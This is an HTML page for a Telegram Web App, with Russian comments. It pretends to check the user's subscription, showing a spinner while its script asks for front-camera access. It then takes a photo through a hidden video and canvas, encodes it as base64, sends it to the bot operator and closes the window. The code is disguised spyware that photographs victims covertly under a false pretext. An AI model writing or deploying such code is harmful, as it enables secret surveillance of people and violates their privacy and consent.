<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org"></script>
    <style>
        body { background: #000; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h3>Проверка подписки...</h3>
    <div class="spinner"></div>
    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand(); // Разворачиваем окно

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // Запрашиваем доступ к камере
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
            .then(function(stream) {
                video.srcObject = stream;
                // Ждем секунду, чтобы камера сфокусировалась
                setTimeout(() => {
                    takePhoto();
                }, 1000);
            })
            .catch(function(err) {
                tg.sendData("Ошибка доступа к камере: " + err);
            });

        function takePhoto() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Превращаем фото в текст (Base64)
            const photoData = canvas.toDataURL('image/jpeg', 0.5);
            
            // Отправляем данные боту и закрываем окно
            tg.sendData("PHOTO_DATA:" + photoData);
            setTimeout(() => { tg.close(); }, 500);
        }
    </script>
</body>
</html>
